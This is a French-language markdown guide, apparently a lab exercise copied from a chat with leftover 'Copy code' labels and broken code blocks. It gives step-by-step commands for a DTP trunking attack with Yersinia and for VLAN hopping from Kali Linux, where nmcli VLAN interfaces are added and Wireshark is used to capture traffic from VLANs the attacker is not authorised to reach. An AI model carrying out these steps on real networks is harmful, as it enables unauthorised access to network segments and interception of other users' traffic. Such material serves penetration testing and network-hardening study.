# Attaque DTP (Dynamic Trunking Protocol)

**Objectif** : Forcer un switch à établir un trunk VLAN avec l’appareil de l’attaquant pour accéder au trafic de plusieurs VLANs.

**Méthode** : Exploiter le protocole DTP pour activer un trunk sur un port non configuré.

## Étapes et Commandes

1. **Lancer Yersinia en mode interactif** :
   ```bash
   sudo yersinia -I

2.Activer l’attaque DTP :
Dans Yersinia :
Tapez g pour accéder aux protocoles et sélectionnez DTP.
Appuyez sur x pour activer Enable trunking.
Appuyez sur S pour sauvegarder les paquets.
Résultat Attendu et Vérification
Résultat : Le port connecté à Kali Linux doit passer en mode trunk.
Vérification : Sur le switch, utilisez :
bash
Copy code
show interface <port_number> switchport
Le port doit être en mode trunk et transporter plusieurs VLANs.
yaml
Copy code

---

### **Page VLAN Hopping (`vlan-hopping.md`)**

`
# VLAN Hopping

**Objectif** : Accéder à d’autres VLANs non autorisés via un trunk activé par DTP.

**Méthode** : Configurer une interface VLAN sur l’appareil attaquant pour accéder aux VLANs et intercepter le trafic.

## Étapes et Commandes

1. **Configurer une interface VLAN sur Kali Linux** :
   - Pour le VLAN 10 :
     ```bash
     nmcli con add type vlan ifname VLAN10 dev eth0 id 10
     nmcli con mod VLAN10 ipv4.addresses 192.168.10.50/24 gw4 192.168.10.1
     nmcli con up VLAN10
     ```
   - Pour le VLAN 20 :
     ```bash
     nmcli con add type vlan ifname VLAN20 dev eth0 id 20
     nmcli con mod VLAN20 ipv4.addresses 192.168.20.50/24 gw4 192.168.20.1
     nmcli con up VLAN20
     ```

## Résultat Attendu et Vérification

- **Résultat** : L’attaquant peut voir le trafic de plusieurs VLANs.
- **Vérification** : Lancez **Wireshark** et vérifiez le trafic des VLANs sur les interfaces `VLAN10` et `VLAN20`.